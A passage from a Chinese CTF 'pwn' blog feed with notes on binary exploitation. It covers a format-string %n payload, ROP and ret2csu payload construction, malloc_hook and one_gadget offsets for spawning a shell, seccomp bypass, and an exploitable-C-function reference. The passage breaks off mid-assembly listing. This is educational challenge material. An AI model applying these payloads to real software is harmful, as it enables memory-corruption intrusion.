href=\"#13格式化字符串漏洞不仅仅用来泄露canary还可以改变地址内的值\">#</a> 13. 格式化字符串漏洞（不仅仅用来泄露 canary，还可以改变地址内的值）</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span>pwnme地址（<span class=\"token number\">32</span>位是<span class=\"token number\">4</span>字节）<span class=\"token operator\">+</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">4</span><span class=\"token operator\">+</span><span class=\"token string\">b\"%10$n\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    有printf<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span>会将输入的payload存入buf偏移为<span class=\"token number\">10</span>的地方<span class=\"token punctuation\">(</span>该偏移需要利用aaaa<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p查看<span class=\"token punctuation\">)</span>，并且将<span class=\"token operator\">%</span><span class=\"token number\">10</span>$前面的八字节大小视作<span class=\"token number\">8</span>存入该地址</pre></td></tr></table></figure><pre><code>http://t.csdn.cn/1sJDx\n</code></pre>\n<h3 id=\"14echo-flag-systemecho-flag\"><a class=\"anchor\" href=\"#14echo-flag-systemecho-flag\">#</a> 14.echo flag 【system(&quot;echo flag&quot;)】</h3>\n<pre><code>输出字符串，后面跟什么就输出什么，这里输出&quot;flag&quot;\n</code></pre>\n<h3 id=\"15valatoistr\"><a class=\"anchor\" href=\"#15valatoistr\">#</a> 15.val=atoi(str)</h3>\n<pre><code>将str转为整数型字符串，当第一个字符不能识别为数字时，函数将停止读入输入字符串\n\nstr=&quot;987654&quot; ,val=(int)987654\n\nstr=&quot;abc&quot; ,      val=0\n</code></pre>\n<h3 id=\"16-charmallocxsizeofchar\"><a class=\"anchor\" href=\"#16-charmallocxsizeofchar\">#</a> 16. (char*)malloc(x*sizeof(char))</h3>\n<pre><code>分配x字节连续的空间，从堆空间中分配，返回值为分配空间的首地址\n</code></pre>\n<h3 id=\"1732位程序构造rop链时\"><a class=\"anchor\" href=\"#1732位程序构造rop链时\">#</a> 17.32 位程序构造 rop 链时</h3>\n<pre><code>因为32位程序是用栈来传参，调用函数返回地址在前参数在后，所以顺序应当为 ：\n\n函数1+函数2+函数3+函数1的参数+函数2的参数+函数3的参数\n</code></pre>\n<h3 id=\"18修改glibc版本\"><a class=\"anchor\" href=\"#18修改glibc版本\">#</a> 18. 修改 glibc 版本</h3>\n<p>当本地 glibc 版本不同会导致堆的地址不同等问题（glibc2.26 版本之后会出现一个新的 TcacheBin，导致释放的 chunk 不会先进入 fastbin 中）</p>\n<pre><code>patchelf --set-interpreter ~/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so --set-rpath ~/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ ~/Downloads/buuctf/babyheap_0ctf_2017\n</code></pre>\n<p>进入到 /pwn/glibc-all-in-one (自己的目录下)，cat list</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pPRkcxf.png\" alt=\"\" /></p>\n<p>用 ./download 下载我们需要的版本</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pPRkoin.png\" alt=\"\" /></p>\n<p>使用上面的命令换版本即可</p>\n<p>【下载不超过请换源，vim download, 注释掉清华源，放出官方源】</p>\n<h3 id=\"19-关于malloc_hook\"><a class=\"anchor\" href=\"#19-关于malloc_hook\">#</a> 19. 关于 malloc_hook</h3>\n<p><code>malloc_hook</code>  指向的地址不为空时则执行其指向的函数，可以以此来 gadget（配合  <code>one_gadget</code>  使用）</p>\n<pre><code>malloc_hook=main_arena-0x10\n\n一般：\nfake_chunk=mian_arena-0x33\n所以 malloc_hook=fake_chunk+0x23\n</code></pre>\n<h3 id=\"20-使用one_gadget工具来得到getshell的函数地址在对应的库目录下使用\"><a class=\"anchor\" href=\"#20-使用one_gadget工具来得到getshell的函数地址在对应的库目录下使用\">#</a> 20. 使用 one_gadget 工具来得到 getshell 的函数地址（在对应的库目录下使用）</h3>\n<p>该工具是基于对应的库来查找的，所以使用时 真正地址为 libc_base + 地址， <strong>下面的需要让 rax 满足对应的要求</strong><br />\n one_gadget 对应的库<br />\n（例如：one_gadget <span class=\"exturl\" data-url=\"aHR0cDovL2xpYmMtMi4yMy5zbw==\">libc-2.23.so</span> , 得到如下结果）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/14/pPRzZNV.png\" alt=\"\" /></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdW5yNHYzMS9wLzE1MTczODExLmh0bWw=\">https://www.cnblogs.com/unr4v31/p/15173811.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjcyMA==\">https://xz.aliyun.com/t/2720</span></p>\n<p>one_gadget，这里记一下比较常用的（libc2.23-0ubuntu11.2 版本已经不在使用）：</p>\n<pre><code>og1=[0x45216,0x4526a,0xf02a4,0xf1147]    #libc2.23-0ubuntu11.2\nog2=[0x45226,0x4527a,0xf0364,0xf1207]    #libc2.23-0ubuntu11.3\n</code></pre>\n<p>下面是利用 read 与 gadget 地址的关系爆破修改（1/16 概率）</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjYxMTEyLmh0bQ==\">https://bbs.kanxue.com/thread-261112.htm</span></p>\n<h3 id=\"21查询程序对应glibc版本\"><a class=\"anchor\" href=\"#21查询程序对应glibc版本\">#</a> 21. 查询程序对应 glibc 版本</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmd1aS5jYy9lbC8zMzI3NzgzLmh0bWw/YWN0aW9uPW9uQ2xpY2s=\">https://www.ngui.cc/el/3327783.html?action=onClick</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjY5MTU1Lmh0bQ==\">https://bbs.kanxue.com/thread-269155.htm</span></p>\n<pre><code>ldd 程序名  //用ldd命令查看当前对应glibc版本\n</code></pre>\n<p>1.ubuntu 16 环境（glibc 2.23~glibc 2.26）</p>\n<p>2.ubuntu18<sub>ubuntu20 环境（glibc2.26</sub>glibc2.32）</p>\n<p>机制更新</p>\n<p>(1) 在 glibc2.26 之后堆管理器中加入了 tcachebin，tcachebin 是 glibc 2.26 版本引入的一种优化机制，用于管理小型内存块的缓存，以加速内存分配和释放的性能。在 tcachebin 中每种大小的堆块最多只能存放 7 个。</p>\n<p>加入了 tcachebin 后，释放的堆块就会优先进入 tcachebin 中，只有当释放的堆块是一个 large bin chunk (大小大于 0x410)，或者 tcachebin 对应大小的堆块已经满 7 个时才会置入 fastbin 或 unsortedbin 中</p>\n<p>(2) 在加入了 tcachebin 后堆管理器在初始化时会先 malloc 一块大小为 0x251 的堆块存放 tcachebins 中指针</p>\n<p>利用方式（要想堆块释放后进入 unsortedbin 中就要绕过 tcachebin，由于程序有堆块申请数量限制难以填满 tcachebin 所以选择 free 一个大小大于 0x410 的堆块）</p>\n<h3 id=\"22fopenarg1arg2\"><a class=\"anchor\" href=\"#22fopenarg1arg2\">#</a> 22.fopen(&quot;arg1&quot;,&quot;arg2&quot;)</h3>\n<p>arg1 为打开文件名，arg2 为打开文件的访问模式（读写等方式）</p>\n<p>文件不存在则返回 NULL</p>\n<h3 id=\"23gdb本地调试\"><a class=\"anchor\" href=\"#23gdb本地调试\">#</a> 23.gdb 本地调试</h3>\n<pre><code class=\"language-pyhton\">from pwn import *\np=process('./ez_pz_hackover_2016')\ncontext.log_level='debug'\n \ngdb.attach(p)  ## 会在此处再打开一个终端\n# 'b *0x8048600'  ##在该终端下设置对应断点（要设置在对应函数结束之前），设置完后必须在新终端按下“c”来继续进行，再在旧终端里按下回车\n，\np.recvuntil('crash: ')\nstack=int(p.recv(10),16)#接收s在栈上的地址\n\npayload='crashme\\x00'+'aaaaaa'#crashme\\x00绕过if判断      \n\npause()  #必须要在发送的payload前面，不然直接发送结束无法查询了\np.sendline(payload)\n \npause()  #必要的，不能少\n</code></pre>\n<p>此处的重点就是在发送 <code>payload</code>  前加入 <code>gdb.attach(p)</code>  和 <code>pause</code> ，发送 <code>payload</code>  后加入 <code>pause()</code> ，然后在产生的新终端内设置断点（也可以在前面直接设置断点： <code>gdb.attach(p,&quot;b *0x8048600&quot;)</code> ）</p>\n<p>然后新终端内输入 <code>c</code>  继续执行，旧终端内按下回车便可以进行查询得到相应的栈情况</p>\n<p>不知道为什么要加入两个 <code>pause（）</code> 才行，前面一个防止程序直接发送结束，无法加入断点；后面一个不加入会导致无法读取栈的情况（程序貌似没有运行结束，个人猜测是设置断点的地方已经不需要栈了）</p>\n<h3 id=\"24命令readelf-s-程序名\"><a class=\"anchor\" href=\"#24命令readelf-s-程序名\">#</a> 24. 命令 readelf -s 程序名</h3>\n<p>直接在终端上运行命令 <code>readelf -s 程序名</code>  可以查看表项（利用 ida 也可以查看）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/20/pPIFR29.png\" alt=\"\" /></p>\n<h3 id=\"2564位构造csu\"><a class=\"anchor\" href=\"#2564位构造csu\">#</a> 25.64 位构造 csu</h3>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/21/pPIT7JU.png\" alt=\"\" /></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">csu</span><span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">,</span>rbp<span class=\"token punctuation\">,</span>r12<span class=\"token punctuation\">,</span>r13<span class=\"token punctuation\">,</span>r14<span class=\"token punctuation\">,</span>r15<span class=\"token punctuation\">,</span>ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>csu1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rbp<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r12<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r13<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r14<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r15<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>csu2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    payload<span class=\"token operator\">+=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">56</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>csu<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>write_got<span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>write_got<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>main_add<span class=\"token punctuation\">)</span> <span class=\"token comment\">#两个必须都是 got 表</span></pre></td></tr></table></figure><p>看到使用 csu 构造 rop，r12 执行的函数必须是在 got 表的地址</p>\n<h3 id=\"26exp输出我们接收的字符\"><a class=\"anchor\" href=\"#26exp输出我们接收的字符\">#</a> 26.exp 输出我们接收的字符</h3>\n<p>利用 <code>log.info(hex() )</code></p>\n<h3 id=\"27prctl-seccomp沙盒机制\"><a class=\"anchor\" href=\"#27prctl-seccomp沙盒机制\">#</a> 27.prctl-seccomp (沙盒机制)</h3>\n<p>利用命令 <code>seccomp-tools dump ./程序名</code> 查看哪些函数被禁用了</p>\n<p>而我们想要绕过需要利用 orw（open/read/write）组合方式读取 flag</p>\n<h3 id=\"28汇编指令jmpjejsjpjojb\"><a class=\"anchor\" href=\"#28汇编指令jmpjejsjpjojb\">#</a> 28. 汇编指令（JMP,JE,JS,JP,JO,JB）</h3>\n<ol>\n<li>\n<p>JMP 无条件跳转</p>\n</li>\n<li>\n<p>JE（JZ）条件跳转</p>\n<p>当 ZF 标致为 1 的时候发生跳转，为 0 的时候不跳转，可以双击标志位，进行判断</p>\n</li>\n<li>\n<p>JNE（JNZ）条件跳转</p>\n<p>当 ZF 标致为 0 的时候发生跳转，为 1 的时候不跳转，可以双击标志位，进行判断</p>\n</li>\n<li>\n<p>JS 条件跳转（JNS 相反操作）</p>\n<p>当为整数时，SF 标志位为 0，负数事 SF 标志位为 1，当 SF 为 1 时，JS 发生跳转</p>\n</li>\n<li>\n<p>JP 条件跳转（JNP 反向操作）</p>\n<p>当二进制 1 的个数为偶数时，PF 标志位为 1，当二进制 1 的个数为奇数时，PF 标志位为 0，当 PF 标志位为 1 时，JP 发生跳转</p>\n</li>\n<li>\n<p>JO 条件跳转（JNO 反向操作）</p>\n<p>当结果溢出了，OF 标志位为 1，JO 会发生跳转，当 OF 标志位为 0 时，JO 不发生跳转</p>\n</li>\n<li>\n<p>JB 条件跳转（JNB 反向操作）</p>\n<p>当结果需要借位或者进位的时候，CF 变为 1，当值 1 的时候，JB 发生跳转</p>\n</li>\n<li>\n<p>JBE 跳转</p>\n<p>当 CF 或者 ZF 标志位 1 的时候跳转</p>\n</li>\n<li>\n<p>JG 跳转</p>\n<p>比较结果为大于时跳转（等于也不行）</p>\n</li>\n</ol>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82MTE1NTI2NzU=\">https://zhuanlan.zhihu.com/p/611552675</span></p>\n",
            "tags": [
                "pwn",
                "二进制"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/24/pwn/c%E5%87%BD%E6%95%B0%E5%8F%8A%E6%BC%8F%E6%B4%9E/",
            "url": "https://vvwwvv.cn/2023/08/24/pwn/c%E5%87%BD%E6%95%B0%E5%8F%8A%E6%BC%8F%E6%B4%9E/",
            "title": "C语言函数（及漏洞利用）",
            "date_published": "2023-08-24T11:23:15.000Z",
            "content_html": "<p>这里用来记录在 pwn 题中一些 C 语言函数的作用和一些函数的漏洞</p>\n<h1 id=\"1-atol-atoi-atoq\"><a class=\"anchor\" href=\"#1-atol-atoi-atoq\">#</a> 1. atol、 atoi、atoq</h1>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>nptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">long</span> <span class=\"token function\">atol</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>nptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span> <span class=\"token function\">atoll</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>nptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span> <span class=\"token function\">atoq</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>nptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><pre><code>atoi:  把字符串nptr转换为int\natol:  把字符串nptr转换为 long int/long long int\natoq:  \n</code></pre>\n<h1 id=\"2__readfsqword0x28u\"><a class=\"anchor\" href=\"#2__readfsqword0x28u\">#</a> 2.__readfsqword(0x28u)</h1>\n<p><strong>这段代码是通常用于 alarm 函数，防止调试</strong></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> <span class=\"token function\">__readfsbyte</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> Offset</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> <span class=\"token function\">__readfsword</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> Offset</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token function\">__readfsdword</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> Offset</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> Offset</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>Offset:<br />\n[in] 从 FS 的开头开始读取的偏移量。</p>\n<p>返回值：位置 FS:[Offset] 处的字节、字、双字或四字（由调用的函数名称指示）的内存内容。</p>\n<h1 id=\"3fopenarg1agr2\"><a class=\"anchor\" href=\"#3fopenarg1agr2\">#</a> 3.fopen(&quot;arg1&quot;,&quot;agr2&quot;)</h1>\n<p>该函数原型：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>FILE <span class=\"token operator\">*</span><span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>filename<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>mode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//filename-- 这是 C 字符串，包含了要打开的文件名称。</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//mode-- 这是 C 字符串，包含了文件访问模式。</span></pre></td></tr></table></figure><p>功能：使用给定的模式 mode 打开 filename 所指向的文件。</p>\n<p>返回值：文件顺利打开后，指向该流的文件指针就会被返回。如果文件打开失败则返回 NULL，并把错误代码存在 error 中。</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/17/pPhGVIA.png\" alt=\"\" /></p>\n<h1 id=\"4freadbuffersizecountstream\"><a class=\"anchor\" href=\"#4freadbuffersizecountstream\">#</a> 4.fread(buffer,size,count,stream)</h1>\n<p>功能：从给定输入流 stream 读取最多 count 个对象到数组 buffer 中（相当于以对每个对象调用 size 次 fgetc），把 buffer 当作 unsigned char 数组并顺序保存结果。流的文件位置指示器前进读取的字节数。</p>\n<p>返回值：</p>\n<pre><code>返回成功读取的对象个数，若出现错误或到达文件末尾，则可能小于count。\n\n若size或count为零，则fread返回零且不进行其他动作。\n\nfread不区分文件尾和错误，因此调用者必须用feof和ferror才能判断发生了什么。\n示例\n</code></pre>\n<ul>\n<li>buffer : 指向要读取的数组中首个对象的指针</li>\n<li>size : 每个对象的大小（单位是字节）</li>\n<li>count : 要读取的对象个数</li>\n<li>stream ：输入流</li>\n</ul>\n<h1 id=\"5-int-sprintfchar-string-char-format-argument\"><a class=\"anchor\" href=\"#5-int-sprintfchar-string-char-format-argument\">#</a> 5. int sprintf(char *string, char *format [,argument,...]);</h1>\n<p><code>将结果打印到字符串中，而printf是直接在命令行上输出</code></p>\n<ul>\n<li>string-- 这是指向一个字符数组的指针，该数组存储了 C 字符串。</li>\n<li>format--format-- 这是字符串，包含了要 <code>被写入到 string 的文本</code> 。它可以包含嵌入的 format 标签，format 标签可被随后的附加参数中指定的值替换，并按需求进行格式化。</li>\n<li>[argument]...：根据不同的 format 字符串，函数可能需要一系列的附加参数，每个参数包含了一个要被插入的值，替换了 format 参数中指定的每个 % 标签。参数的个数应与 % 标签的个数相同。</li>\n</ul>\n<p>返回值：</p>\n<p>如果成功，则返回写入的字符总数，不包括字符串追加在字符串末尾的空字符。如果失败，则返回一个负数。</p>\n<p>sprintf 返回以 format 为格式 argument 为内容组成的结果被写入 string 的字节数，结束字符‘\\0’不计入内。即，如果 “Hello” 被写入空间足够大的 string 后，函数 sprintf 返回 5。</p>\n<pre><code>转换字符\n%% 印出百分比符号，不转换。\n%c 字符输出到缓冲区，不转换。\n%d 整数转成十进位。\n%f 倍精确度数字转成浮点数。\n%o 整数转成八进位。\n%s 字符串输出到缓冲区，不转换。\n%x 整数转成小写十六进位。\n%X 整数转成大写十六进位。\n</code></pre>\n<h1 id=\"6memchrconst-void-buf-int-ch-size_t-count\"><a class=\"anchor\" href=\"#6memchrconst-void-buf-int-ch-size_t-count\">#</a> 6.memchr(const void *buf, int ch, size_t count)</h1>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">extern</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token function\">memchr</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>buf    <span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> ch    <span class=\"token punctuation\">,</span>  <span class=\"token class-name\">size_t</span> count<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>功能：从 buf 所指内存区域的前 count 个字节查找字符 ch。</p>\n<p>说明：当第一次遇到字符 ch 时停止查找。如果成功，返回指向字符 ch 的指针；否则返回 NULL。</p>\n<h1 id=\"7memcpyvoid-destin-void-source-unsigned-n\"><a class=\"anchor\" href=\"#7memcpyvoid-destin-void-source-unsigned-n\">#</a> 7.memcpy(void *destin, void *source, unsigned n)</h1>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>destin<span class=\"token punctuation\">,</span>   <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>source<span class=\"token punctuation\">,</span>    <span class=\"token keyword\">unsigned</span> n<span class=\"token punctuation\">)</span>；</pre></td></tr></table></figure><p>功能：从源 source 所指的内存地址的起始位置开始拷贝 n 个字节到目标 destin 所指的内存地址的起始位置中</p>\n<p>返回值：该函数返回一个指向目标存储区 destin 的指针。</p>\n<ul>\n<li>destin-- 指向用于存储复制内容的目标数组，类型强制转换为 void* 指针。</li>\n<li>source-- 指向要复制的数据源，类型强制转换为 void* 指针。</li>\n<li>n-- 要被复制的字节数。</li>\n</ul>\n<h1 id=\"8char-strcat-char-destination-const-char-source\"><a class=\"anchor\" href=\"#8char-strcat-char-destination-const-char-source\">#</a> 8.char * strcat ( char * destination, const char * source );</h1>\n<p>功能：strcat 的实现模式是将 src 中的所有字符（连同字符串最后的’\\0’一起）加到 dest 字符串中第一个‘\\0’的位置，具体一点说就是将 dest 中第一个’\\0’替换成 src 的第一个字符，然后该’\\0’后的字符替换成 src 的第二个字符，后面以此类推。【把 src 所指向的字符串追加到 dest 所指向的字符串的结尾】</p>\n<p>返回值：该函数返回一个指向最终的目标字符串 dest 的指针。</p>\n<h1 id=\"9fork\"><a class=\"anchor\" href=\"#9fork\">#</a> 9.fork（）</h1>\n<p>fork 被调用一次会返回两次（后面的语句也就判断 2 次），返回 0 代表其是子进程，而在父进程中接到的返回值是子进程的 pid，fork 为负值代表出现错误</p>\n<p>调用 fork 会产生一个子进程，子进程会复制父进程的当前状态，这时两个进程便会开始同时运行，且执行顺序不一定</p>\n<pre><code>子进程的fork（）返回值为0 #第一次返回（不分先后，第一次返回也可能是父进程的fork）\n父进程的fork（）返回值为子进程的pid  #第二次返回\n</code></pre>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N1aXQyMDE2MTIzMDcwL2FydGljbGUvZGV0YWlscy84MzI4MDEyNQ==\">https://blog.csdn.net/cuit2016123070/article/details/83280125</span></p>\n<h1 id=\"10int-fclose-file-fp-可以利用linux命令重定向标准输入输出控制\"><a class=\"anchor\" href=\"#10int-fclose-file-fp-可以利用linux命令重定向标准输入输出控制\">#</a> 10.int fclose (FILE *fp); 【可以利用 Linux 命令重定向标准输入输出控制】</h1>\n<p>功能：关闭文件输出流（使用 fclose () 函数就可以把 缓冲区内最后剩余的数据输出到内核缓冲区，并释放 文件指针和有关的缓冲区。 ）</p>\n<p>返回值：如果流成功关闭，fclose 返回 0，否则返回 EOF（-1）【关闭成功返回 1】。（如果流为 NULL，而且程序可以继续执行，fclose 设定 error number 给 EINVAL，并返回 EOF。）</p>\n<p>绕过方式：Linux 的  <code>exec（cat [文件名]） 1&gt;&amp;0</code>  ，在 Linux 系统中文件描述符 <code>1为标准输出流，0为标准输入流，2为标准错误（输出到屏幕）</code> ，而通过 <code>&amp;+文件描述符</code> 的方式可以代替文件名，（这里就指向了该终端，所以结果显示在终端上 <code>因为默认打开一个终端后，0，1，2都指向该终端</code> ）</p>\n",
            "tags": [
                "pwn",
                "C语言"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/24/pwn/ROP/ret2csu/",
            "url": "https://vvwwvv.cn/2023/08/24/pwn/ROP/ret2csu/",
            "title": "64位构造通用ROP，ret2csu",
            "date_published": "2023-08-24T11:23:15.000Z",
            "content_html": "<h1 id=\"ret2csu\"><a class=\"anchor\" href=\"#ret2csu\">#</a> ret2csu</h1>\n<h2 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理</h2>\n<ul>\n<li>64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候我们很难找到每个寄存器对应的 gadges。这时候，我们可以利用 x64 下的__libc_csu_init 中的 gadgets。</li>\n<li>这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。</li>\n</ul>\n<h4 id=\"下面借用别人在ida摘出来的__libc_csu_init函数的汇编指令\"><a class=\"anchor\" href=\"#下面借用别人在ida摘出来的__libc_csu_init函数的汇编指令\">#</a> 下面借用别人在 IDA 摘出来的__libc_csu_init 函数的汇编指令</h4>\n<pre><code>.text:00000000004011B0 ; void _libc_csu_init(void)\n.text:00000000004011B0                 public __libc_csu_init\n.text:00000000004011B0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o\n.text:00000000004011B0 ; __unwind &#123;\n.text:00000000004011B0                 push    r15\n.text:00000000004011B2                 mov     r15, rdx\n.text:00000000004011B5                 push    r14\n.text:00000000004011B7                 mov     r14, rsi\n.text:00000000004011BA                 push    r13\n.text:00000000004011BC                 mov     r13d, edi\n.text:00000000004011BF                 push    r12\n.text:00000000004011C1                 lea     r12, 